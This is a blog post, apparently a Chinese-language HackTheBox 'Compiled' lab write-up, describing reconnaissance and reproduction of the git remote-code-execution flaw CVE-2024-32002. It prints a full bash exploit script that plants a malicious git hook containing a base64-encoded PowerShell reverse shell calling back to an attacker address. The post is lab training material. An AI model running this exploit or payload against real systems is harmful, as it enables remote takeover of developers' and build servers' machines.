@@ -1,0 +1,737 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.27.0" theme-name="Stellar" theme-version="1.27.0">
+  
+  <meta name="generator" content="Hexo 7.1.1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>HTB-Compiled_Write-up - AyMeow</title>
+
+  
+    <meta name="description" content="HTB-Compiled_Write-up  | •́ ▾ •̀ |">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Compiled_Write-up">
+<meta property="og:url" content="http://example.com/2024/09/27/HTB-Compiled_Write-up/index.html">
+<meta property="og:site_name" content="AyMeow">
+<meta property="og:description" content="HTB-Compiled_Write-up  | •́ ▾ •̀ |">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f623c7f21886ccc0a04e1a.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f623c7f21886ccc0a04db4.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f623c7f21886ccc0a04ddb.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f623c7f21886ccc0a04def.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f623c7f21886ccc0a04e0a.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f623f6f21886ccc0a0727f.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f623f6f21886ccc0a0729d.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f623f6f21886ccc0a07238.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f623f6f21886ccc0a07256.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f623f6f21886ccc0a0726c.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f62431f21886ccc0a0a2dd.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f62431f21886ccc0a0a31a.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f62431f21886ccc0a0a34d.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f62431f21886ccc0a0a359.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f62431f21886ccc0a0a36b.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f62463f21886ccc0a0cdb7.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f62463f21886ccc0a0cd5e.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f62463f21886ccc0a0cd73.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f62463f21886ccc0a0cd88.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f62463f21886ccc0a0cd9d.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f6249cf21886ccc0a0fb0e.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f6249cf21886ccc0a0fb21.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f6249cf21886ccc0a0fb32.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f6249cf21886ccc0a0fb3c.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f6249cf21886ccc0a0fb4d.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f62510f21886ccc0a15ccd.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f62510f21886ccc0a15cda.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f62510f21886ccc0a15ce5.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f62510f21886ccc0a15cf5.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f62510f21886ccc0a15cfd.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f6253cf21886ccc0a18a32.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f6253cf21886ccc0a189f6.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f6253cf21886ccc0a18a02.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f627d2f21886ccc0a3f31e.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f6253cf21886ccc0a18a1f.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f625a7f21886ccc0a1f0ca.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f625a7f21886ccc0a1f0d7.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f625a7f21886ccc0a1f0eb.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f625a7f21886ccc0a1f0ae.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f625d1f21886ccc0a21730.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f625d1f21886ccc0a21738.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f625d1f21886ccc0a2176d.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f625d1f21886ccc0a2177a.jpg">
+<meta property="article:published_time" content="2024-09-27T03:20:00.000Z">
+<meta property="article:modified_time" content="2024-09-27T03:37:11.979Z">
+<meta property="article:author" content="AyMeow">
+<meta property="article:tag" content="靶场复现">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://pic.imgdb.cn/item/66f623c7f21886ccc0a04e1a.jpg">
+  
+  
+  
+  <meta name="keywords" content="靶场复现">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.27.0">
+
+  
+    <link rel="shortcut icon" href="https://pic.imgdb.cn/item/6618980e68eb935713c75160.png">
+  
+
+  
+
+  
+</head>
+<body>
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://pic.imgdb.cn/item/660b811b9f345e8d03388bae.gif" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">AyMeow</div><div class="sub normal cap">一只猫猫的Blog</div><div class="sub hover cap" style="opacity:0"> Wu~la!</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a></nav>
+</div>
+<div class="widgets">
+
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/09/27/HTB-Compiled_Write-up/"><span class="title">HTB-Compiled_Write-up</span></a><a class="item title" href="/2024/09/20/HTB-Editorial_Write-up/"><span class="title">HTB-Editorial_Write-up</span></a><a class="item title" href="/2024/09/12/HTB-Blurry_Write-up/"><span class="title">HTB-Blurry_Write-up</span></a><a class="item title" href="/2024/09/18/HTB-BoardLight_Write-up/"><span class="title">HTB-BoardLight_Write-up</span></a><a class="item title" href="/2024/09/19/HTB-Permx_Write-up/"><span class="title">HTB-Permx_Write-up</span></a><a class="item title" href="/2024/09/24/HTB-MonitorsThree_Write-up/"><span class="title">HTB-MonitorsThree_Write-up</span></a><a class="item title" href="/2024/04/24/Vulntarget-B-Write-up/"><span class="title">Vulntarget-B_Write-up</span></a><a class="item title" href="/2024/04/26/VulnHub-DarkHole_2-Write-up/"><span class="title">VulnHub-DarkHole-2_Write-up</span></a><a class="item title" href="/2024/04/29/VulnHub-SickOS1.1-Write-up/"><span class="title">VulnHub-SickOS1.1_Write-up</span></a><a class="item title" href="/2024/03/28/CTF%E8%B5%9B%E9%A2%98%E7%AC%94%E8%AE%B0/"><span class="title">CTF赛题笔记</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top"><img class="bg lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f623a8f21886ccc0a0346a.jpg">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/">靶场复现</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-09-27T03:20:00.000Z">2024-09-27</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-09-27T03:37:11.979Z">2024-09-27</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>HTB-Compiled_Write-up</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><p>HTB-Compiled_Write-up  | •́ ▾ •̀ |</p>
+<span id="more"></span>
+
+<h1 id="HTB-Compiled-Write-up"><a href="#HTB-Compiled-Write-up" class="headerlink" title="HTB-Compiled_Write-up"></a>HTB-Compiled_Write-up</h1><h2 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1.前期准备"></a>1.前期准备</h2><ul>
+<li><p>连接VPN！</p>
+</li>
+<li><p>靶场详情：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f623c7f21886ccc0a04e1a.jpg" data-fancybox="true" alt="Compiled-0" />
+</li>
+<li><p>测试连通性：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f623c7f21886ccc0a04db4.jpg" data-fancybox="true" alt="Compiled-1" />
+</li>
+<li><p>连接稳定，开始打靶！</p>
+</li>
+</ul>
+<hr>
+<h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><p>起手还是Nmap扫描，靶机介绍是Windows系统的，扫描的速度有些久：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f623c7f21886ccc0a04ddb.jpg" data-fancybox="true" alt="Compiled-2" />
+
+<p>扫出来一个3000端口和5000端口，尝试了一下可以直接访问，不需要加hosts文件也行；3000是个Gitea，5000是个可以提交代码仓库的网站：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f623c7f21886ccc0a04def.jpg" data-fancybox="true" alt="Compiled-3" />
+
+<hr>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f623c7f21886ccc0a04e0a.jpg" data-fancybox="true" alt="Compiled-4" />
+
+<p>Gitea的Explore里有一些信息，计算器的那个项目有提到使用的Git版本，还暴露了域名信息：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f623f6f21886ccc0a0727f.jpg" data-fancybox="true" alt="Compiled-5" />
+
+<p>这个Gitea的功能貌似就是像个Github一样的代码托管仓库，5000端口的那个站似乎可以将项目提交上去编译，考虑到环境，大概就是在靶机本地编译了；找到了Git的版本，也去搜了一下，有一个CVE-2024-32002的远程代码执行漏洞：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f623f6f21886ccc0a0729d.jpg" data-fancybox="true" alt="Compiled-6" />
+
+<p>嗯…看不懂，于是开始Write-up学习法，去翻了其他师傅的Write-up，漏洞倒是找对了，就是这个漏洞原理一时半会搞不明白，后面发现复现起来也挺吃力的…这漏洞很新，POC也是四个月前才出的，打着打着就发现POC都用不明白…</p>
+<blockquote>
+<p>相关文章可参考：<a target="_blank" rel="noopener" href="https://amalmurali.me/posts/git-rce/">https://amalmurali.me/posts/git-rce/</a></p>
+<p>POC：<a target="_blank" rel="noopener" href="https://github.com/amalmurali47/git_rce">https://github.com/amalmurali47/git_rce</a></p>
+</blockquote>
+<p>分析的文章看不大明白，此处就只体现复现过程了，等以后实力提升了再回头来复习复习吧…</p>
+<hr>
+<h2 id="3-CVE-2024-32002复现"><a href="#3-CVE-2024-32002复现" class="headerlink" title="3.CVE-2024-32002复现"></a>3.CVE-2024-32002复现</h2><p>根据文章，先在Gitea注册一个账号，然后创建两个空的仓库，这里密码简单点也无所谓满足长度即可：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f623f6f21886ccc0a07238.jpg" data-fancybox="true" alt="Compiled-7" />
+
+<p>新建仓库：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f623f6f21886ccc0a07256.jpg" data-fancybox="true" alt="Compiled-8" />
+
+<p>创建好的仓库如下图：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f623f6f21886ccc0a0726c.jpg" data-fancybox="true" alt="Compiled-9" />
+
+<p>随后将上文提到的POC克隆到Kali里，进去文件夹把sh脚本提取出来到一个你喜欢的目录，我这就选&#x2F;tmp了，然后开始改脚本：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/amalmurali47/git_rce.git</span><br></pre></td></tr></table></figure>
+
+<p>这个脚本改了一个下午，参考了多位师傅的Write-up，属于是东拼西凑了，不过还好，成功运行，改的过程虽然难受，不过对我来说还是加深了一些对这个漏洞的理解，至少大概知道这个脚本是怎么运作的了。不过脚本的内容我这就暂时不做注释了，毕竟还没完全理解，以免产生歧义，各位可以对照着POC中的原脚本进行对比理解。</p>
+<blockquote>
+<p>生成反弹Shell的网址：<a target="_blank" rel="noopener" href="https://www.ddosi.org/shell/">https://www.ddosi.org/shell/</a></p>
+<p>PS：注意是选PowerShell #3 (Base64)</p>
+</blockquote>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f62431f21886ccc0a0a2dd.jpg" data-fancybox="true" alt="Compiled-10" style="zoom:50%;" />
+
+<p>脚本如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">git config --global protocol.file.allow always</span><br><span class="line">git config --global core.symlinks true</span><br><span class="line">git config --global init.defaultBranch main </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">选第一个仓库</span></span><br><span class="line">hook_repo_path=&quot;http://gitea.compiled.htb:3000/AyMeow/repo1.git&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">git clone &quot;$hook_repo_path&quot;</span><br><span class="line">cd repo1</span><br><span class="line">mkdir -p y/hooks</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cat &gt; y/hooks/post-checkout &lt;&lt;EOF</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里是反弹Shell的代码</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgAzACIALAA0ADQAMwAwADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chmod +x y/hooks/post-checkout</span><br><span class="line">git add y/hooks/post-checkout</span><br><span class="line">git commit -m &quot;post-checkout&quot;</span><br><span class="line">git push</span><br><span class="line">cd ..</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里选第二个仓库</span></span><br><span class="line">captain_repo_path=&quot;http://gitea.compiled.htb:3000/AyMeow/repo2.git&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">git clone &quot;$captain_repo_path&quot;</span><br><span class="line">cd repo2</span><br><span class="line">git submodule add --name x/y &quot;$hook_repo_path&quot; A/modules/x</span><br><span class="line">git commit -m &quot;add-submodule&quot;</span><br><span class="line"></span><br><span class="line">printf &quot;.git&quot; &gt; dotgit.txt</span><br><span class="line">git hash-object -w --stdin &lt; dotgit.txt &gt; dot-git.hash</span><br><span class="line">printf &quot;120000 %s 0\ta\n&quot; &quot;$(cat dot-git.hash)&quot; &gt; index.info</span><br><span class="line">git update-index --index-info &lt; index.info</span><br><span class="line">git commit -m &quot;add-symlink&quot;</span><br><span class="line">git push</span><br><span class="line">cd ..</span><br></pre></td></tr></table></figure>
+
+<p>修改好脚本之后，运行脚本即可，随后将脚本中的第二个仓库的链接放入端口5000的那个站进行编译，同时再起一个终端监听你反弹Shell的端口，等编译完成后，Shell就会被弹回来，在前面的步骤没错的情况下，这个反弹Shell的过程预计要等待个1到5分钟不等，需要一点耐心：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f62431f21886ccc0a0a31a.jpg" data-fancybox="true" alt="Compiled-11" style="zoom: 67%;" />
+
+<p>回头看一眼仓库：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f62431f21886ccc0a0a34d.jpg" data-fancybox="true" alt="Compiled-12" />
+
+<p>然后我们把repo2的连接丢到5000端口的站去编译，同时我们开启监听：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f62431f21886ccc0a0a359.jpg" data-fancybox="true" alt="Compiled-13" />
+
+<p>我的5000站的页面不知道为啥显示不全，样式都没加载完，进得也很慢，不过不影响执行就是了，点击提交后就是漫长的等待了，其实如果网络状况好的话还是挺快的：</p>
